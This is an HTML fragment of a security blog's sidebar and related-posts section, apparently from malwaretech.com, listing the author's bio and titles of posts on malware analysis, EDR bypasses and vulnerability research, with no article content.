    <h4 class="widget__title">Stay Informed</h4>
  </div>
  <div class="row post__meta">
    <div class="col col-12 col-d-12 col-t-12">
      
    </div>
  </div>
</div>

      
<div class="widget-sidebar widget-author">
  
  <div class="widget-image-box">
    <a href="https://marcushutchins.com/" target="_blank" class="widget-author-image" style="background-image: url(/images/profile.png);" aria-label="Marcus Hutchins's Picture"></a>
  </div>
  

  <h5 class="widget-author-name"><a href="https://marcushutchins.com/" target="_blank">Marcus Hutchins</a></h5>
  <div class="widget-author-bio">Threat intelligence analyst, programmer, ex-hacker.</div>

  <div class="widget-author-meta">
    


  </div>
</div>

      


<div class="widget-sidebar widget-featured ">
  <div class="widget__head section-top">
    <h4 class="widget__title">Featured Posts</h4>
  </div>
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2025/10/exif-smuggling.html" style="background-image: url(/images/better-cache-smuggling/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2025-10-24T19:45:00+00:00">Oct 24, 2025</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2025/10/exif-smuggling.html">Passively Downloading Malware Payloads Via Image Caching</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2025/08/every-reason-why-i-hate-ai.html" style="background-image: url(/images/every-reason-why-i-hate-ai/cover.jpg)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2025-08-04T08:12:00+00:00">Aug 4, 2025</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2025/08/every-reason-why-i-hate-ai.html">Every Reason Why I Hate AI and You Should Too</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2025/03/the-us-needs-a-new-cybersecurity-strategy.html" style="background-image: url(/images/the-us-needs-a-new-cybersecurity-strategy/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2025-03-28T05:23:00+00:00">Mar 28, 2025</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2025/03/the-us-needs-a-new-cybersecurity-strategy.html">The US Needs A New Cybersecurity Strategy: More Offensive Cyber Operations Isn't It</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html" style="background-image: url(/images/CVE-2024-38063/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2024-08-27T06:46:00+00:00">Aug 27, 2024</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html">CVE-2024-38063 - Remotely Exploiting The Kernel Via IPv6</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html" style="background-image: url(/images/bypassing-edrs-with-edr-preload/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2024-02-13T05:22:00+00:00">Feb 13, 2024</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html">Bypassing EDRs With EDR-Preloading</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html" style="background-image: url(/images/silly-edr-bypasses-and-where-to-find-them/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2023-12-27T01:40:00+00:00">Dec 27, 2023</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html">Silly EDR Bypasses and Where To Find Them</a></h6>
    </div>
  </div>
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html" style="background-image: url(/images/syscalls/cover.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2023-12-25T07:00:00+00:00">Dec 25, 2023</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html">An Introduction to Bypassing User Mode EDR Hooks</a></h6>
    </div>
  </div>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2020/12/how-i-found-my-first-ever-zeroday-in-rdp.html" style="background-image: url(/wp-content/uploads/2020/12/thumb-4.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2020-12-31T23:36:41+00:00">Dec 31, 2020</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2020/12/how-i-found-my-first-ever-zeroday-in-rdp.html">How I Found My First Ever ZeroDay (In RDP)</a></h6>
    </div>
  </div>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2018/03/best-programming-languages-to-learn-for-malware-analysis.html" style="background-image: url(/wp-content/uploads/2018/02/documentation.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2018-03-19T09:44:27+00:00">Mar 19, 2018</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2018/03/best-programming-languages-to-learn-for-malware-analysis.html">Best Languages to Learn for Malware Analysis</a></h6>
    </div>
  </div>
  
  
  
  
  
  
  
  
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" style="background-image: url(/wp-content/uploads/2017/05/WannaCrypt.jpg)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2017-05-13T12:04:19+00:00">May 13, 2017</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html">How to Accidentally Stop a Global Cyber Attacks</a></h6>
    </div>
  </div>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <div class="featured-posts">
    
    <a class="featured-posts__image fadein" href="https://malwaretech.com/2015/04/hard-disk-firmware-hacking-part-1.html" style="background-image: url(/wp-content/uploads/2015/04/HDD_Controller.png)"></a>
    
    <div class="featured-posts__content">
      <div class="featured-posts__date">
        <time datetime="2015-04-13T14:27:00+00:00">Apr 13, 2015</time>
      </div>
      <h6 class="featured-posts__title"><a href="https://malwaretech.com/2015/04/hard-disk-firmware-hacking-part-1.html">Hard Disk Firmware Hacking (Part 1)</a></h6>
    </div>
  </div>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
</div>

      <div class="widget-sidebar widget-tags">
  <div class="widget__head section-top">
    <h4 class="widget__title">Explore Topics</h4>
  </div>
  <div class="widget-tags__inner">
    
    
    <a href="https://malwaretech.com/tag/explainers" class="widget__tag"><h5 class="widget__tag-name">Explainers</h5><span class="widget__tag-count">14</span></a>
    
    
    <a href="https://malwaretech.com/tag/malware" class="widget__tag"><h5 class="widget__tag-name">Malware</h5><span class="widget__tag-count">16</span></a>
    
    
    <a href="https://malwaretech.com/tag/windows-internals" class="widget__tag"><h5 class="widget__tag-name">Windows Internals</h5><span class="widget__tag-count">11</span></a>
    
    
    <a href="https://malwaretech.com/tag/hacking" class="widget__tag"><h5 class="widget__tag-name">Hacking</h5><span class="widget__tag-count">13</span></a>
    
    
    <a href="https://malwaretech.com/tag/vulnerability-research" class="widget__tag"><h5 class="widget__tag-name">Vulnerability Research</h5><span class="widget__tag-count">11</span></a>
    
    
    <a href="https://malwaretech.com/tag/news" class="widget__tag"><h5 class="widget__tag-name">News</h5><span class="widget__tag-count">10</span></a>
    
    
    <a href="https://malwaretech.com/tag/analysis" class="widget__tag"><h5 class="widget__tag-name">Analysis</h5><span class="widget__tag-count">10</span></a>
    
    
    <a href="https://malwaretech.com/tag/malware-analysis" class="widget__tag"><h5 class="widget__tag-name">Malware Analysis</h5><span class="widget__tag-count">16</span></a>
    
    
    <a href="https://malwaretech.com/tag/programming" class="widget__tag"><h5 class="widget__tag-name">Programming</h5><span class="widget__tag-count">4</span></a>
    
    
    <a href="https://malwaretech.com/tag/threat-intelligence" class="widget__tag"><h5 class="widget__tag-name">Threat Intelligence</h5><span class="widget__tag-count">13</span></a>
    
    
    <a href="https://malwaretech.com/tag/opinions" class="widget__tag"><h5 class="widget__tag-name">Opinions</h5><span class="widget__tag-count">12</span></a>
    
    
    <a href="https://malwaretech.com/tag/stories" class="widget__tag"><h5 class="widget__tag-name">Stories</h5><span class="widget__tag-count">3</span></a>
    
    
    <a href="https://malwaretech.com/tag/wannacry" class="widget__tag"><h5 class="widget__tag-name">WannaCry</h5><span class="widget__tag-count">2</span></a>
    
    
    <a href="https://malwaretech.com/tag/videos" class="widget__tag"><h5 class="widget__tag-name">Videos</h5><span class="widget__tag-count">3</span></a>
    
    
    <a href="https://malwaretech.com/tag/artificial-intelligence" class="widget__tag"><h5 class="widget__tag-name">Artificial Intelligence</h5><span class="widget__tag-count">1</span></a>
    
    
    <a href="https://malwaretech.com/tag/technology" class="widget__tag"><h5 class="widget__tag-name">Technology</h5><span class="widget__tag-count">1</span></a>
    
    
    <a href="https://malwaretech.com/tag/offensive-security" class="widget__tag"><h5 class="widget__tag-name">Offensive Security</h5><span class="widget__tag-count">1</span></a>
    
  </div>
</div>
    </div>
  </div>
</div>







<div class="container">
  <div class="related-posts section is-related">
    <div class="section-top">
      <h5 class="section-title">You may also like</h5>
    </div>
    <div class="row grid">
    

      
      

      

      

        <div class="article col col-4 col-d-6 col-t-12 grid__post">
          
          <a class="article__image" href="https://malwaretech.com/2025/10/exif-smuggling.html">
            
            <span class="featured-post"><i class="ion ion-ios-star-outline"></i></span>
            
            <img class="fadein" src="https://malwaretech.com/images/better-cache-smuggling/cover.png" alt="Passively Downloading Malware Payloads Via Image Caching">
          </a>
          
        
          <div class="article__content">
            <div class="article-tags">
              <span class="article__date"><time datetime="2025-10-24T19:45:00+00:00">Oct 24, 2025</time></span>
              
              <div class="article-tags__box">
                
                <a href="https://malwaretech.com/tag/offensive-security" class="article__tag">Offensive Security</a>
                
                <a href="https://malwaretech.com/tag/windows-internals" class="article__tag">Windows Internals</a>
                
                <a href="https://malwaretech.com/tag/malware" class="article__tag">Malware</a>
                
              </div>
              
            </div>
            <h2 class="article__title">
              <a href="https://malwaretech.com/2025/10/exif-smuggling.html">Passively Downloading Malware Payloads Via Image Caching</a>
            </h2>
            <div class="article__meta">
              <div class="article__author">
                
              </div>
            </div>
          </div>
        </div>

        
        
      
    

      
      

      

      
    

      
      

      

      
    

      
      

      

      

        <div class="article col col-4 col-d-6 col-t-12 grid__post">
          
          <a class="article__image" href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html">
            
            <span class="featured-post"><i class="ion ion-ios-star-outline"></i></span>
            
            <img class="fadein" src="https://malwaretech.com/images/CVE-2024-38063/cover.png" alt="CVE-2024-38063 - Remotely Exploiting The Kernel Via IPv6">
          </a>
          
        
          <div class="article__content">
            <div class="article-tags">
              <span class="article__date"><time datetime="2024-08-27T06:46:00+00:00">Aug 27, 2024</time></span>
              
              <div class="article-tags__box">
                
                <a href="https://malwaretech.com/tag/vulnerability-research" class="article__tag">Vulnerability Research</a>
                
                <a href="https://malwaretech.com/tag/windows-internals" class="article__tag">Windows Internals</a>
                
              </div>
              
            </div>
            <h2 class="article__title">
              <a href="https://malwaretech.com/2024/08/exploiting-CVE-2024-38063.html">CVE-2024-38063 - Remotely Exploiting The Kernel Via IPv6</a>
            </h2>
            <div class="article__meta">
              <div class="article__author">
                
              </div>
            </div>
          </div>
        </div>

        
        
      
    

      
      

      

      
    

      
      

      

      

        <div class="article col col-4 col-d-6 col-t-12 grid__post">
          
          <a class="article__image" href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html">
            
            <span class="featured-post"><i class="ion ion-ios-star-outline"></i></span>
            
            <img class="fadein" src="https://malwaretech.com/images/silly-edr-bypasses-and-where-to-find-them/cover.png" alt="Silly EDR Bypasses and Where To Find Them">
          </a>
          
        
          <div class="article__content">
            <div class="article-tags">
              <span class="article__date"><time datetime="2023-12-27T01:40:00+00:00">Dec 27, 2023</time></span>
              
              <div class="article-tags__box">
                
                <a href="https://malwaretech.com/tag/programming" class="article__tag">Programming</a>
                
                <a href="https://malwaretech.com/tag/windows-internals" class="article__tag">Windows Internals</a>
                
                <a href="https://malwaretech.com/tag/malware" class="article__tag">Malware</a>
                
              </div>
              
            </div>
            <h2 class="article__title">
              <a href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html">Silly EDR Bypasses and Where To Find Them</a>
            </h2>
            <div class="article__meta">
              <div class="article__author">
                
              </div>
            </div>
          </div>
        </div>

        
        
          
    </div>
  </div>
</div>
  </main> 
  <!-- end content -->
  
  
  <!-- begin footer -->

<!-- end footer -->
  









<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>


</body></html>